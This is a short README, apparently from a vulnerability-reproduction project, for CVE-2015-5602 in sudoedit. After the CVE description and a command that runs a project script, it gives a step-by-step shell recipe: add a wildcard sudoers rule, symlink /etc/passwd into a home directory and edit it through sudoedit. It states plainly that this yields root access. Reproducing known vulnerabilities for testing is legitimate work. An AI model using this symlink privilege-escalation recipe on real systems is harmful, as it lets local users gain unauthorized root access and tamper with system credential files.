# CVE-2015-5602

### Description
sudoedit in Sudo before 1.8.15 allows local users to gain privileges via a symlink attack on a file whose full path is defined using multiple wildcards in `/etc/sudoers`, as demonstrated by `/home/*/*/file.txt`.

### Command to run
```shell
python cve_debian.py -n 2015-5602 -v bullseye -d sudoedit -s
```

### Simple testing method

```shell
adduser haxor
echo "haxor ALL=(root) NOPASSWD: sudoedit /home/*/*/test.txt" >> /etc/sudoers
su haxor
cd; mkdir demo
ln -s /etc/passwd demo/test.txt
sudoedit demo/test.txt #Should not be working 
sudoedit /home/haxor/demo/test.txt # Should be working
```
You can edit the file and then get root access.